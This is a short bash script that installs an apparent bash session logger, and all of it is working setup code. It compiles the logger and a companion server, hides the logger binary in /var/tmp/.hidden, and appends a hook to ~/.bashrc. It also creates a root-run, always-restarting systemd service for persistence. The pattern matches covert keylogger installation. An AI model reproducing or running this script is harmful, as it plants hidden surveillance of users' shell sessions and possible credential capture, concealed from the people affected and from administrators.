#!/bin/bash

# Compile the logger
gcc -o logger logger.c
gcc -o server server.c

# Move logger to a hidden location
mkdir -p /var/tmp/.hidden
cp logger /var/tmp/.hidden/
chmod +x /var/tmp/.hidden/logger

# Add bash hook to .bashrc
echo "# Bash session logger" >> ~/.bashrc
echo "source /path/to/bash_hook.sh" >> ~/.bashrc

# Create systemd service for auto-start (for root access)
cat > /etc/systemd/system/bash-logger.service << EOF
[Unit]
Description=Bash Session Logger
After=network.target

[Service]
ExecStart=/var/tmp/.hidden/logger
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl daemon-reload
systemctl enable bash-logger.service
systemctl start bash-logger.service

echo "Installation complete. The logger will start on next login."